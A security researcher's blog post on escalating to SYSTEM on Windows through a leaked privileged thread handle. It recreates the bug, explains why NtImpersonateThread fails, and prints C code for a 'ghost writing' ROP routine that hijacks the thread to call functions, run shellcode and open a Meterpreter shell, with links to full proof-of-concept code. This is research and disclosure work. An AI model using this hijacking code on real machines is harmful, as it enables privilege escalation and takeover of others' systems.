---
layout: post
title: Whoops… I dropped my SYSTEM thread HANDLE
date: '2024-10-10 00:00:00'
img_path: /assets/img/2024-10-10/
categories: ['Windows', 'Binary']
tags: []
---

I recently came across an interesting finding from [PrivescCheck](https://github.com/itm4n/PrivescCheck), the tool reported an exploitable leaked thread handle. This is when a privileged process leaks a handle (in this case a thread handle) into an unprivileged process, effectively allowing the unprivileged user to gain access to the privileged handle. These must be manually investigated and while mine was unfortunately a false positive, I still wanted to understand how one would exploit this vulnerability.

## Recreating the Vulnerability

You might be wondering how this happens? Well if you look at the [CreateProcessA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) documentation, you will see:

> bInheritHandles - If this parameter is TRUE, each inheritable handle in the calling process is inherited by the new process.

So if a SYSTEM service created a process inside the user’s desktop with [CreateProcessAsUserA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera), and set `bInheritHandles` to TRUE, all inheritable handles within the SYSTEM process are now also available inside the user process.

I recreated this exact setup with <https://github.com/Acebond/LeakyService>. This service will pop-up a cmd.exe inside the user’s desktop with a leaked SYSTEM thread handle.

## Exploitation the Wrong Way

A [bunch of blogs](https://dronesec.pw/blog/exploiting-leaked-process-and-thread-handles/) will say this can be exploited with `NtImpersonateThread`. The idea is that the low privileged user can impersonate the thread token, to gain code execution with a SYSTEM thread token. While the blog mentioned above is excellent, I call bullshit and everyone who says this can PoC \|\| GTFO. An example of what they _think_ can be done is here: <https://github.com/Acebond/NtImpersonateThreadMethod>.

This method fails, and `NtImpersonateThread` only creates a thread running with an [impersonation level](https://learn.microsoft.com/en-us/windows/win32/secauthz/impersonation-levels) of `SecurityIdentification`. The attack requires `SeImpersonatePrivilege` privilege, which no low privileged user should ever had, otherwise they would hardly be low privileged. If the low privileged user did have `SeImpersonatePrivilege`, this would work, and the newly created thread would be running with a SYSTEM token with an impersonation level of `SecurityImpersonation`.

## Exploitation the Right Way

I couldn't find any other way to exploit this other than doing ROP with `SetThreadContext`, `GetThreadContext`, `SuspendThread`, and `ResumeThread`.

The Internet seems to call this “ghost writing” since no process level manipulation such as `ReadProcessMemory`, `WriteProcessMemory`, and `CreateRemoteThread` are performed, because, well, we can’t - we only have access to the thread, not the process.

I based my PoC heavily on <https://github.com/fern89/ghostwriting-2>. This was about the best PoC for ghost writing I could find, except it was only for 32bit.

The ROP requires 3 gadgets:

1. A `ret` gadget. This pops an address off the stack and jumps to that address. We use it to execute function after setting up the parameters.
2. A `jmp $ gadget`. This jumps backward by 2 bytes and causes `rip` to jump back to itself, creating an infinite loop. We use it to stop the thread from executing past our push gadget and into the unknown.
3. A `push rdx; call rax gadget`. This will push `rdx` onto the stack, a value we control, and then be used to call `rax` which will hold the address of our `jmp $` infinite loop gadget. We use it to push data to the stack, and effectively halt the thread from doing anything meaningful.

The 3rd gadget could be anything like:

```
push reg1; call reg2
push reg1; jmp reg2
push reg1; push reg2; ret
mov [reg1]; ret
mov [reg1]; call reg2
mov [reg1]; jmp reg2
```

With these gadgets, and a **VERY** good (nobody seems to talk about the shadow space (except <https://retroscience.net/x64-assembly.html>, thank you) understanding of the Windows 64bit calling convention, we can execute a function in the remote thread like so:

```
DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL returnVal, const uint64_t count, const DWORD64 parameters[]) {

    // 1. Check/Fix Stack alignment
    CONTEXT ctx = { .ContextFlags = CONTEXT_FULL };

    SuspendThread(hThread);
    GetThreadContext(hThread, &ctx);

    int isStackAlignmentGood = ((ctx.Rsp + 0x08) == ((ctx.Rsp + 0x08) & ~0x0F));
    int isEvenPUSHParameters = ((count <= 4) || (count % 2 == 0));

    ResumeThread(hThread);

    if (isStackAlignmentGood ^ isEvenPUSHParameters) {
        PushData(hThread, gadgets, 0x00);
    }

    // 2. PUSH function parameters
    for (uint64_t i = count; i > 4; i--) {
        PushData(hThread, gadgets, parameters[i-1]);
    }

    // 3. PUSH shadow space if required
    if (count > 4) {
        PushData(hThread, gadgets, 0x00);
        PushData(hThread, gadgets, 0x00);
        PushData(hThread, gadgets, 0x00);
        PushData(hThread, gadgets, 0x00);
    }

    // 4. PUSH jmps save return pointer
    PushData(hThread, gadgets, gadgets.jmps);

    // 5. PUSH function to call address
    PushData(hThread, gadgets, funcAddr);

    // 6. Execute with ret gadget
    Slay(hThread, gadgets, 
        (count > 0 ? parameters[0] : 0),
        (count > 1 ? parameters[1] : 0),
        (count > 2 ? parameters[2] : 0),
        (count > 3 ? parameters[3] : 0)
    );

    // 7. Ensure the thread _did_ something
    WaitUnblock(hThread);

    // 8. Get return value if required
    return (returnVal ? GetReturnValue(hThread, gadgets) : 0);
}
```
Full code here: <https://github.com/Acebond/GhostWrite64>

We use this to `VirtualAlloc` some memory in the privileged process, write some shellcode to that memory with a named pipe, and then call `CreateThread` to execute the shellcode, and lastly, restore the hijacked thread back to whatever it was doing. The full PoC is on [GitHub](https://github.com/Acebond/GhostWrite64) and has some cool tricks like figuring out if the target thread has been scheduled on the CPU yet, and how to determine if we need to realign the stack.

**PoC \|\| GTFO**

In the screenshot below, LeakyService is running, and will spawn a cmd.exe as the lowpriv user. The cmd.exe (PID 9060 in this example) has a leaked thread handle to the LeakyService.exe which is running as SYSTEM.

![System Informer showing the leaked handle](/assets/img/2024-10-10/process.png)

To exploit this, I ran the GhostWrite PoC inside the cmd.exe (you’d otherwise have to `OpenProcess` and `DuplicateHandle`); this causes the leaked handle to leak again from cmd.exe into GhostWrite.exe, because cmd creates process with inherit handles set to TRUE.

![PoC getting a Meterpreter shell](/assets/img/2024-10-10/poc.png)

GhostWrite then hijacks the SYSTEM thread using the leaked handle and the ROP method described above, creates its own thread inside the SYSTEM process to run a Meterpreter shellcode, and seamlessly restores the original thread execution. Easy-peasy lemon squeezy.